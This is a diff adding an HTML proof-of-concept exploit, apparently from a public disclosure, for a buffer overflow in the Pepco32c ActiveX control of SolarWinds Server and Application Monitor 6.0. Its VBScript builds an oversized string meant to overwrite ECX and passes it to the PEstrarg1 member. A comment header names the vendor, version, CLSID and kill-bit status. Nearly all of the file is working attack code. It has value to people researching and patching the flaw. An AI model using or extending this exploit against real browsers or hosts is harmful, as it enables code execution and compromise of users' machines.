@@ -1,0 +1,31 @@
+<html>
+<!--
+SolarWinds Server and Application Monitor ActiveX (Pepco32c) Buffer Overflow
+Vendor: SolarWinds
+Version: 6.0
+Tested on: Windows 2003 SP2 / IE
+Download: http://www.solarwinds.com/downloads/
+Author: Blake
+
+CLSID: 8AE9F829-D587-42BB-B5C1-09EE8D9547FA
+Path: C:\Program Files\Common Files\SolarWinds\Pepco32c.ocx
+Member Name: PEstrarg1
+Progid: PEPCO32CLib.Pepco
+Safe for Scripting: False
+Safe for Initialization: False
+Kill Bit: False
+-->
+
+<object classid='clsid:8AE9F829-D587-42BB-B5C1-09EE8D9547FA' id='target' ></object>
+<script language='vbscript'>
+
+' 132 bytes in we control ecx before the call ecx instruction
+
+buffer = String(132, "A")
+ecx = String(4, "B")
+junk = String(3086, "C")
+arg1 = buffer + ecx + junk
+
+target.PEstrarg1 = arg1
+
+</script>
